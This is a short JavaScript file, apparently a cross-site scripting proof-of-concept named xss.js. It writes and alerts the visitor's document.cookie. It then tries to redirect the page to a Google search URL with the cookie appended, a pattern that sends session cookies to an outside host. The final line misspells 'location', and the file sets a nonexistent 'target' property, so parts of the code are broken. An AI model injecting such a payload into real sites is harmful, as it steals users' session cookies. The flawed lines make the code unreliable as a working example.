document.write ("This is remote text via xss.js located at han's github " + document.cookie);
alert ("This is remote text via xss.js located at han's github " + document.cookie);
window.location.target="_blank";
window.loaction.href="https://www.google.com/search?q=" + document.cookie;
